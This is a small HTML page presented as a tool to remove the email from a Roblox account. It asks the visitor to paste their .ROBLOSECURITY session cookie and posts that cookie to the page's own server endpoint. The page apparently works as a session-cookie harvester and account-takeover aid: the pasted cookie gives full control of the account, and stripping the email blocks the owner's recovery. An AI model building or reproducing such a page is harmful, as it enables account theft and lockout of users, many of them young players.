<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Remove Email from Roblox</title>
  <style>
    body {
      font-family: sans-serif;
      max-width: 400px;
      margin: 60px auto;
      padding: 20px;
      border: 1px solid #ccc;
      border-radius: 12px;
      background: #f9f9f9;
    }
    input, button {
      width: 100%;
      margin-top: 12px;
      padding: 10px;
      font-size: 14px;
    }
    .result {
      margin-top: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h2>Remove Email from Roblox</h2>
  <input type="text" id="cookie" placeholder=".ROBLOSECURITY Cookie" />
  <button onclick="removeEmail()">Remove Email</button>
  <div class="result" id="result"></div>

  <script>
    async function removeEmail() {
      const cookie = document.getElementById('cookie').value;
      const resultDiv = document.getElementById('result');

      const res = await fetch('/api/remove-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ cookie })
      });

      const data = await res.json();
      resultDiv.innerText = data.success ? '✅ Email removed' : '❌ Failed: ' + (data.message || 'Unknown error');
    }
  </script>
</body>
</html>
